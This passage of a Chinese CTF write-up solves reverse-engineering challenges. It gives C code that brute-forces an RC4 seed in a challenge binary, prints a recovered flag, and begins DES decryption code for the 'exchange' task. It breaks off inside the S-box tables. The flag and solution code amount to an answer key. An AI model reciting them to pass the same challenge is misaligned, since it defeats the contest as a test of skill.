class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/load_elf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/logger.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/breakpoint.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* path = <span class="string">&quot;./conforand&quot;</span>;</span><br><span class="line">        <span class="type">void</span>* base = <span class="built_in">load_elf</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="type">__uint64_t</span>  (*rc4)(<span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) = <span class="built_in">get_symbol_by_offset</span>(base,<span class="number">0x413170</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> key[]=<span class="string">&quot;JustDoIt!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> EncData[]=&#123;<span class="number">0x83</span>,<span class="number">0x1e</span>,<span class="number">0x9c</span>,<span class="number">0x48</span>,<span class="number">0x7a</span>,<span class="number">0xfa</span>,<span class="number">0xe8</span>,<span class="number">0x88</span>,<span class="number">0x36</span>,<span class="number">0xd5</span>,<span class="number">0x0a</span>,<span class="number">0x08</span>,<span class="number">0xf6</span>,<span class="number">0xa7</span>,<span class="number">0x70</span>,<span class="number">0x0f</span>,<span class="number">0xfd</span>,<span class="number">0x67</span>,<span class="number">0xdd</span>,<span class="number">0xd4</span>,<span class="number">0x3c</span>,<span class="number">0xa7</span>,<span class="number">0xed</span>,<span class="number">0x8d</span>,<span class="number">0x51</span>,<span class="number">0x10</span>,<span class="number">0xce</span>,<span class="number">0x6a</span>,<span class="number">0x9e</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0xe7</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x67</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x6e</span>,<span class="number">0xcd</span>,<span class="number">0x2f</span>&#125;;</span><br><span class="line"></span><br><span class="line">                *(<span class="type">unsigned</span> <span class="type">int</span>*)(<span class="number">0x4068D3</span>) = i;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">rc4</span>(EncData,<span class="number">42</span>,key,<span class="number">9</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(EncData[<span class="number">0</span>] == <span class="string">&#x27;H&#x27;</span> </span><br><span class="line">                        &amp;&amp; EncData[<span class="number">1</span>] == <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">                        &amp;&amp; EncData[<span class="number">2</span>] == <span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Seed:%d\n&quot;</span>,i);</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%.42s\n&quot;</span>,EncData);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/13/TGCTF2025/OnhobJQFKoZ69oxRCQycK3OZnCh.png"></p><p>HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}</p><h2 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h2><p>输入的字符串经过 unhex、拆分字节，改变顺序。</p><p>如：<strong>11</strong>-&gt;<strong>0x31 0x31</strong>-&gt;<strong>‘3’ ‘1’ ‘3’ ‘1’</strong>-&gt;<strong>‘3’ ‘3’ ‘1’ ‘1’</strong></p><p>是两个字节为一组进行变换的。</p><p>然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是”HZNUCTF{“字串。</p><p><img src="/2025/04/13/TGCTF2025/IpzebVjiWokSsPxbqbvcFPuqnpc.png"></p><p>主加密函数，发现只走这上面的部分。</p><p><img src="/2025/04/13/TGCTF2025/V80kbgNWwoxANlxB4YMcWunPnhb.png"></p><p>第一个函数是用”HZNUCTF{“字串生成的一串数据，64 个整数数据。</p><p>第二个函数是将输入数据 8 个字节为一组进行加密。</p><p>加密流程：</p><ol><li>4 个字节为一组进行翻转</li><li>8 字节加密</li><li>4 个字节为一组进行翻转</li></ol><p><img src="/2025/04/13/TGCTF2025/Li3ibSsH4oXPrgxpuE1cXiC3nWf.png"></p><p>加密可以看出是 DES 加密算法，是对称的，key 就是刚刚生成的 64 个整数数值的前 32 个，那么可以知道后 32 个就是解密用的 key，直接 copy 该函数，解密时用生成的后 32 个整数 key 即可解密。</p><p><img src="/2025/04/13/TGCTF2025/S3IQbDNbQoHoZAxTqEycpqhpnJf.png"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s1[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x01010400</span>, <span class="number">0x00000000</span>, <span class="number">0x00010000</span>, <span class="number">0x01010404</span>, <span class="number">0x01010004</span>, <span class="number">0x00010404</span>, <span class="number">0x00000004</span>, <span class="number">0x00010000</span>,</span><br><span class="line">    <span class="number">0x00000400</span>, <span class="number">0x01010400</span>, <span class="number">0x01010404</span>, <span class="number">0x00000400</span>, <span class="number">0x01000404</span>, <span class="number">0x01010004</span>, <span class="number">0x01000000</span>, <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000404</span>, <span class="number">0x01000400</span>, <span class="number">0x01000400</span>, <span class="number">0x00010400</span>, <span class="number">0x00010400</span>, <span class="number">0x01010000</span>, <span class="number">0x01010000</span>, <span class="number">0x01000404</span>,</span><br><span class="line">    <span class="number">0x00010004</span>, <span class="number">0x01000004</span>, <span class="number">0x01000004</span>, <span class="number">0x00010004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000404</span>, <span class="number">0x00010404</span>, <span class="number">0x01000000</span>,</span><br><span class="line">    <span class="number">0x00010000</span>, <span class="number">0x01010404</span>, <span class="number">0x00000004</span>, <span class="number">0x01010000</span>, <span class="number">0x01010400</span>, <span class="number">0x01000000</span>, <span class="number">0x01000000</span>, <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x01010004</span>, <span class="number">0x00010000</span>, <span class="number">0x00010400</span>, <span class="number">0x01000004</span>, <span class="number">0x00000400</span>, <span class="number">0x00000004</span>, <span class="number">0x01000404</span>, <span class="number">0x00010404</span>,</span><br><span class="line">    <span class="number">0x01010404</span>, <span class="number">0x00010004</span>, <span class="number">0x01010000</span>, <span class="number">0x01000404</span>, <span class="number">0x01000004</span>, <span class="number">0x00000404</span>, <span class="number">0x00010404</span>, <span class="number">0x01010400</span>,</span><br><span class="line">    <span class="number">0x00000404</span>, <span class="number">0x01000400</span>, <span class="number">0x01000400</span>, <span class="number">0x00000000</span>, <span class="number">0x00010004</span>, <span class="number">0x00010400</span>, <span class="number">0x00000000</span>, <span class="number">0x01010004</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s2[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x80108020</span>, <span class="number">0x80008000</span>, <span class="number">0x00008000</span>, <span class="number">0x00108020</span>, <span class="number">0x00100000</span>, <span class="number">0x00000020</span>, <span class="number">0x80100020</span>, <span class="number">0x80008020</span>,</span><br><span class="line">    <span class="number">0x80000020</span>, <span class="number">0x80108020</span>, <span class="number">0x80108000</span>, <span class="number">0x80000000</span>, <span class="number">0x80008000</span>, <span class="number">0x00100000</span>, <span class="number">0x00000020</span>, <span class="number">0x80100020</span>,</span><br><span class="line">    <span class="number">0x00108000</span>, <span class="number">0x00100020</span>, <span class="number">0x80008020</span>, <span class="number">0x00000000</span>, <span class="number">0x80000000</span>, <span class="number">0x00008000</span>, <span class="number">0x00108020</span>, <span class="number">0x80100000</span>,</span><br><span class="line">    <span class="number">0x00100020</span>, <span class="number">0x80000020</span>, <span class="number">0x00000000</span>, <span class="number">0x00108000</span>, <span class="number">0x00008020</span>, <span class="number">0x80108000</span>, <span class="number">0x80100000</span>, <span class="number">0x00008020</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00108020</span>, <span class="number">0x80100020</span>, <span class="number">0x00100000</span>, <span class="number">0x80008020</span>, <span class="number">0x80100000</span>, <span class="number">0x80108000</span>, <span class="number">0x00008000</span>,</span><br><span class="line">    <span class="number">0x80100000</span>, <span class="number">0x80008000</span>, <span class="number">0x00000020</span>, <span class="number">0x80108020</span>, <span class="number">0x00108020</span>, <span class="number">0x00000020</span>, <span class="number">0x00008000</span>, <span class="number">0x80000000</span>,</span><br><span class="line">    <span class="number">0x00008020</span>, <span class="number">0x80108000</span>, <span class="number">0x00100000</span>, <span class="number">0x80000020</span>, <span class="number">0x00100020</span>, <span class="number">0x80008020</span>, <span class="number">0x80000020</span>, <span class="number">0x00100020</span>,</span><br><span class="line">    <span class="number">0x00108000</span>, <span class="number">0x00000000</span>, <span class="number">0x80008000</span>, <span class="number">0x00008020</span>, <span class="number">0x80000000</span>, <span class="number">0x80100020</span>, <span class="number">0x80108020</span>, <span class="number">0x00108000</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s3[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000208</span>, <span class="number">0x08020200</span>, <span class="number">0x00000000</span>, <span class="number">0x08020008</span>, <span class="number">0x08000200</span>, <span class="number">0x00000000</span>, <span class="number">0x00020208</span>, <span class="number">0x08000200</span>,</span><br><span class="line">    <span class="number">0x00020008</span>, <span class="number">0x08000008</span>, <span class="number">0x08000008</span>, <span class="number">0x00020000</span>, <span class="number">0x08020208</span>, <span class="number">0x00020008</span>, <span class="number">0x08020000</span>, <span class="number">0x00000208</span>,</span><br><span class="line">    <span class="number">0x08000000</span>, <span class="number">0x00000008</span>, <span class="number">0x08020200</span>, <span class="number">0x00000200</span>, <span class="number">0x00020200</span>, <span class="number">0x08020000</span>, <span class="number">0x08020008</span>, <span class="number">0x00020208</span>,</span><br><span class="line">    <span class="number">0x08000208</span>, <span class="number">0x00020200</span>, <span class="number">0x00020000</span>, <span class="number">0x08000208</span>, <span class="number">0x00000008</span>, <span class="number">0x08020208</span>, <span class="number">0x00000200</span>, <span class="number">0x08000000</span>,</span><br><span class="line">    <span class="number">0x08020200</span>, <span class="number">0x08000000</span>, <span class="number">0x00020008</span>, <span class="number">0x00000208</span>, <span class="number">0x00020000</span>, <span class="number">0x08020200</span>, <span class="number">0x08000200</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000200</span>, <span class="number">0x00020008</span>, <span class="number">0x08020208</span>, <span class="number">0x08000200</span>, <span class="number">0x08000008</span>, <span class="number">0x00000200</span>, <span class="number">0x00000000</span>, <span class="number">0x08020008</span>,</span><br><span class="line">    <span class="number">0x08000208</span>, <span class="number">0x00020000</span>, <span class="number">0x08000000</span>, <span class="number">0x08020208</span>, <span class="number">0x00000008</span>, <span class="number">0x00020208</span>, <span class="number">0x00020200</span>, <span class="number">0x08000008</span>,</span><br><span class="line">    <span class="number">0x08020000</span>, <span class="number">0x08000208</span>, <span class="number">0x00000208</span>, <span class="number">0x08020000</span>, <span class="number">0x00020208</span>, <span class="number">0x00000008</span>, <span class="number">0x08020008</span>, <span class="number">0x00020200</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s4[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00802001</span>, <span class="number">0x00002081</span>, <span class="number">0x00002081</span>, <span class="number">0x00000080</span>, <span class="number">0x00802080</span>, <span class="number">0x00800081</span>, <span class="number">0x00800001</span>, <span class="number">0x00002001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00802000</span>, <span class="number">0x00802000</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000000</span>, <span class="number">0x00800080</span>, <span class="number">0x00800001</span>,</span><br><span class="line">    <span class="number">0x00000001</span>, <span class="number">0x00002000</span>, <span class="number">0x00800000</span>, <span class="number">0x00802001</span>, <span class="number">0x00000080</span>, <span class="number">0x00800000</span>, <span class="number">0x00002001</span>, <span class="number">0x00002080</span>,</span><br><span class="line">    <span class="number">0x00800081</span>, <span class="number">0x00000001</span>, <span class="number">0x00002080</span>, <span class="number">0x00800080</span>, <span class="number">0x00002000</span>, <span class="number">0x00802080</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>,</span><br><span class="line">    <span class="number">0x00800080</span>, <span class="number">0x00800001</span>, <span class="number">0x00802000</span>, <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00802000</span>,</span><br><span class="line">    <span class="number">0x00002080</span>, <span class="number">0x00800080</span>, <span class="number">0x00800081</span>, <span class="number">0x00000001</span>, <span class="number">0x00802001</span>, <span class="number">0x00002081</span>, <span class="number">0x00002081</span>, <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0x00802081</span>, <span class="number">0x00000081</span>, <span class="number">0x00000001</span>, <span class="number">0x00002000</span>, <span class="number">0x00800001</span>, <span class="number">0x00002001</span>, <span class="number">0x00802080</span>, <span class="number">0x00800081</span>,</span><br><span class="line">    <span class="number">0x00002001</span>, <span class="number">0x00002080</span>, <span class="number">0x00800000</span>, <span class="number">0x00802001</span>, <span class="number">0x00000080</span>, <span class="number">0x00800000</span>, <span class="number">0x00002000</span>, <span class="number">0x00802080</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s5[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000100</span>, <span class="number">0x02080100</span>, <span class="number">0x02080000</span>, <span class="number">0x42000100</span>, <span class="number">0x00080000</span>, <span class="number">0x00000100</span>, <span class="number">0x40000000</span>, <span class="number">0x02080000</span>,</span><br><span class="line">    <span class="number">0x40080100</span>, <span class="number">0x00080000</span>, <span class="number">0x02000100</span>, <span class="number">0x40080100</span>, <span class="number">0x42000100</span>, <span class="number">0x42080000</span>, <span class="number">0x00080100</span>, <span class="number">0x40000000</span>,</span><br><span class="line">    <span class="number">0x02000000</span>, <span class="number">0x40080000</span>, <span class="number">0x40080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40000100</span>, <span class="number">0x42080100</span>, <span class="number">0x42080100</span>, <span class="number">0x02000100</span>,</span><br><span class="line">    <span class="number">0x42080000</span>, <span class="number">0x40000100</span>, <span class="number">0x00000000</span>, <span class="number">0x42000000</span>, <span class="number">0x02080100</span>, <span class="number">0x02000000</span>, <span class="number">0x42000000</span>, <span class="number">0x00080100</span>,</span><br><span class="line">    <span class="number">0x00080000</span>, <span class="number">0x42000100</span>, <span class="number">0x00000100</span>, <span class="number">0x02000000</span>, <span class="number">0x40000000</span>, <span class="number">0x02080000</span>, <span class="number">0x42000100</span>, <span class="number">0x40080100</span>,</span><br><span class="line">    <span class="number">0x02000100</span>, <span class="number">0x40000000</span>, <span class="number">0x42080000</span>, <span class="number">0x02080100</span>, <span class="number">0x40080100</span>, <span class="number">0x00000100</span>, <span class="number">0x02000000</span>, <span class="number">0x42080000</span>,</span><br><span class="line">    <span class="number">0x42080100</span>, <span class="number">0x00080100</span>, <span class="number">0x42000000</span>, <span class="number">0x42080100</span>, <span class="number">0x02080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40080000</span>, <span class="number">0x42000000</span>,</span><br><span class="line">    <span class="number">0x00080100</span>, <span class="number">0x02000100</span>, <span class="number">0x40000100</span>, <span class="number">0x00080000</span>, <span class="number">0x00000000</span>, <span class="number">0x40080000</span>, <span class="number">0x02080100</span>, <span class="number">0x40000100</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s6[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x20000010</span>, <span class="number">0x20400000</span>, <span class="number">0x00004000</span>, <span class="number">0x20404010</span>, <span class="number">0x20400000</span>, <span class="number">0x00000010</span>, <span class="number">0x20404010</span>, <span class="number">0x00400000</span>,</span><br><span class="line">    <span class="number">0x20004000</span>, <span class="number">0x00404010</span>, <span class="number">0x00400000</span>, <span class="number">0x20000010</span>, <span class="number">0x00400010</span>, <span class="number">0x20004000</span>, <span class="number">0x20000000</span>, <span class="number">0x00004010</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>, <span class="number">0x00004000</span>, <span class="number">0x00404000</span>, <span class="number">0x20004010</span>, <span class="number">0x00000010</span>, <span class="number">0x20400010</span>,</span><br><span class="line">    <span class="number">0x20400010</span>, <span class="number">0x00000000</span>, <span class="number">0x00404010</span>, <span class="number">0x20404000</span>, <span class="number">0x00004010</span>, <span class="number">0x00404000</span>, <span class="number">0x20404000</span>, <span class="number">0x20000000</span>,</span><br><span class="line">    <span class="number">0x20004000</span>, <span class="number">0x00000010</span>, <span class="number">0x20400010</span>, <span class="number">0x00404000</span>, <span class="number">0x20404010</span>, <span class="number">0x00400000</span>, <span class="number">0x00004010</span>, <span class="number">0x20000010</span>,</span><br><span class="line">    <span class="number">0x00400000</span>, <span class="number">0x20004000</span>, <span class="number">0x20000000</span>, <span class="number">0x00004010</span>, <span class="number">0x20000010</span>, <span class="number">0x20404010</span>, <span class="number">0x00404000</span>, <span class="number">0x20400000</span>,</span><br><span class="line">    <span class="number">0x00404010</span>, <span class="number">0x20404000</span>, <span class="number">0x00000000</span>, <span class="number">0x20400010</span>, <span class="number">0x00000010</span>, <span class="number">0x00004000</span>, <span class="number">0x20400000</span>, <span class="number">0x00404010</span>,</span><br><span class="line">    <span class="number">0x00004000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>, <span class="number">0x00000000</span>, <span class="number">0x20404000</span>, <span class="number">0x20000000</span>, <span class="number">0x00400010</span>, <span class="number">0x20004010</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s7[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x00200000</span>, <span class="number">0x04200002</span>, <span class="number">0x04000802</span>, <span class="number">0x00000000</span>, <span class="number">0x00000800</span>, <span class="number">0x04000802</span>, <span class="number">0x00200802</span>, <span class="number">0x04200800</span>,</span><br><span class="line">    <span class="number">0x04200802</span>, <span class="number">0x00200000</span>, <span class="number">0x00000000</span>, <span class="number">0x04000002</span>, <span class="number">0x00000002</span>, <span class="number">0x04000000</span>, <span class="number">0x04200002</span>, <span class="number">0x00000802</span>,</span><br><span class="line">    <span class="number">0x04000800</span>, <span class="number">0x00200802</span>, <span class="number">0x00200002</span>, <span class="number">0x04000800</span>, <span class="number">0x04000002</span>, <span class="number">0x04200000</span>, <span class="number">0x04200800</span>, <span class="number">0x00200002</span>,</span><br><span class="line">    <span class="number">0x04200000</span>, <span class="number">0x00000800</span>, <span class="number">0x00000802</span>, <span class="number">0x04200802</span>, <span class="number">0x00200800</span>, <span class="number">0x00000002</span>, <span class="number">0x04000000</span>, <span class="number">0x00200800</span>,</span><br><span class="line">    <span class="number">0x04000000</span>, <span class="number">0x00200800</span>, <span class="number">0x00200000</span>, <span class="number">0x04000802</span>, <span class="number">0x04000802</span>, <span class="number">0x04200002</span>, <span class="number">0x04200002</span>, <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00200002</span>, <span class="number">0x04000000</span>, <span class="number">0x04000800</span>, <span class="number">0x00200000</span>, <span class="number">0x04200800</span>, <span class="number">0x00000802</span>, <span class="number">0x00200802</span>, <span class="number">0x04200800</span>,</span><br><span class="line">    <span class="number">0x00000802</span>, <span class="number">0x04000002</span>, <span class="number">0x04200802</span>, <span class="number">0x04200000</span>, <span class="number">0x00200800</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x04200802</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00200802</span>, <span class="number">0x04200000</span>, <span class="number">0x00000800</span>, <span class="number">0x04000002</span>, <span class="number">0x04000800</span>, <span class="number">0x00000800</span>, <span class="number">0x00200002</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s8[<span class="number">64</span>] = &#123;</span><br><span class="line">    <span class="number">0x10001040</span>, <span class="number">0x00001000</span>, <span class="number">0x00040000</span>, <span class="number">0x10041040</span>, <span class="number">0x10000000</span>, <span class="number">0x10001040</span>, <span class="number">0x00000040</span>, <span class="number">0x10000000</span>,</span><br><span class="line">    <span class="number">0x00040040</span>, <span class="number">0x10040000</span>, <span class="number">0x10041040</span>, <span class="number">0x00041000</span>, <span class="number">0x10041000</span>, <span class="number">0x00041040</span>, <span class="number">0x00001000</span>, <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x10040000</span>, <span class="number">0x10000040</span>, <span class="number">0x10001000</span>, <span class="number">0x00001040</span>, <span class="number">0x00041000</span>, <span class="number">0x00040040</span>, <span class="number">0x10040040</span>, <span class="number">0x10041000</span>,</span><br><span class="line">    <span class="number">0x00001040</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x10040040</span>, <span class="number">0x10000040</span>, <span class="number">0x10001000</span>, <span class="number">0x00041040</span>, <span class="number">0x00040000</span>,</span><br><span class="line">    <span class="number">0x00041040</span>, <span class="number">0x00040000</span>, <span class="number">0x10041000</span>, <span class="number">0x00001000</span>, <span class="number">0x00000040</span>, <span class="number">0x10040040</span>, <span class="number">0x00001000</span>, <span class="number">0x00041040</span>,</span><br><span class="line">    <span class="number">0x10001000</span>, <span class="number">0x00000040</span>, <span class="number">0x10000040</span>, <span class="number">0x10040000</span>, <span class="number">0x10040040</span>, <span class="number">0x10000000</span>, <span class="number">0x00040000</span>, <span class="number">0x10001040</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x10041040</span>, <span class="number">0x00040040</span>, <span class="number">0x10000040</span>, <span class="number">0x10040000</span>, <span class="number">0x10001000</span>, <span class="number">0x10001040</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x10041040</span>, <span class="number">0x00041000</span>, <span class="number">0x00041000</span>, <span class="number">0x00001040</span>, <span class="number">0x00001040</span>, <span class="number">0x00040040</span>, <span class="number">0x10000000</span>, <span class="number">0x10041000</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> word_7FF65FC70900[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x0080</span>, <span class="number">0x0040</span>, <span class="number">0x0020</span>, <span class="number">0x0010</span>, <span class="number">0x0008</span>, <span class="number">0x0004</span>, <span 